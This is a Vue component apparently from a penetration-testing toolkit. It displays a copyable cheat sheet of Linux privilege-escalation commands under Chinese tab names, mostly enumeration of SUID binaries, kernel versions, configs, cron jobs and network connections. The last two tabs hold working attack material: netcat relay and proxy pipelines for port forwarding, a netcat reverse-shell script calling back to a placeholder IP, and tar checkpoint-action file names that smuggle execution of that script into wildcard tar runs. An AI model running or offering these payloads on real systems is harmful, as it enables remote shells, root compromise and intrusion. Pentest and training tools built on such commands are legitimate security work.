<template>
  <div class="space-y-4">
    <TabView :tabs="categories">
      <template v-for="(cat, idx) in categories" :key="idx" #[`tab-${idx}`]>
        <div class="space-y-2">
          <div
            v-for="(cmd, cidx) in sections[cat]"
            :key="cidx"
            class="flex items-center justify-between gap-2 rounded-md border px-3 py-2"
            style="border-color: var(--color-border); background-color: var(--color-bg-secondary);"
          >
            <code class="text-xs font-mono flex-1" style="color: var(--color-text); white-space: pre-wrap; word-break: break-all;">{{ cmd }}</code>
            <CopyButton :text="cmd" />
          </div>
        </div>
      </template>
    </TabView>
  </div>
</template>

<script setup lang="ts">
import TabView from '../../common/TabView.vue';
import CopyButton from '../../common/CopyButton.vue';

const categories = ['SUID', '系统版本', '内核版本', '环境变量', '服务配置', '定时任务', '网络连接', '端口转发', 'Wildcard 提权'];

const sections: Record<string, string[]> = {
  'SUID': [
    'find / -user root -perm /4000 2>/dev/null',
    'find / -perm -u=s -type f 2>/dev/null',
    "find / -type f -name '*.txt' 2>/dev/null",
    'find / -user root -perm -4000 -exec ls -ldb {} \\; > /tmp/suid',
    'getcap -r / 2>/dev/null',
  ],
  '系统版本': [
    'cat /etc/issue',
    'cat /etc/*-release',
    'cat /etc/lsb-release',
    'cat /etc/redhat-release',
  ],
  '内核版本': [
    'cat /proc/version',
    'uname -a',
    'uname -mrs',
    'rpm -q kernel',
    'dmesg | grep Linux',
    'ls /boot | grep vmlinuz',
  ],
  '环境变量': [
    'cat /etc/profile',
    'cat /etc/bashrc',
    'cat ~/.bash_profile',
    'cat ~/.bashrc',
    'cat ~/.bash_logout',
    'env',
    'set',
  ],
  '服务配置': [
    'cat /etc/syslog.conf',
    'cat /etc/chttp.conf',
    'cat /etc/lighttpd.conf',
    'cat /etc/cups/cupsd.conf',
    'cat /etc/inetd.conf',
    'cat /etc/apache2/apache2.conf',
    'cat /etc/my.conf',
    'cat /etc/httpd/conf/httpd.conf',
    'cat /opt/lampp/etc/httpd.conf',
    "ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'",
  ],
  '定时任务': [
    'crontab -l',
    'ls -alh /var/spool/cron',
    'ls -al /etc/ | grep cron',
    'ls -al /etc/cron*',
    'cat /etc/cron*',
    'cat /etc/at.allow',
    'cat /etc/at.deny',
    'cat /etc/cron.allow',
    'cat /etc/cron.deny',
    'cat /etc/crontab',
    'cat /etc/anacrontab',
    'cat /var/spool/cron/crontabs/root',
  ],
  '网络连接': [
    'lsof -i',
    'lsof -i :80',
    'grep 80 /etc/services',
    'netstat -antup',
    'netstat -antpx',
    'netstat -tulpn',
    'chkconfig --list',
    'chkconfig --list | grep 3:on',
    'last',
    'lastlog',
  ],
  '端口转发': [
    'FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]',
    'FPipe.exe -l 80 -r 80 -s 80 192.168.1.7',
    'ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]',
    'ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port',
    'ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port',
    'mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe',
    'mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay',
    'mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy',
  ],
  'Wildcard 提权': [
    'echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> 1234 >/tmp/f" > shell.sh',
    'touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"',
    'touch "/var/www/html/--checkpoint=1"',
  ],
};
</script>
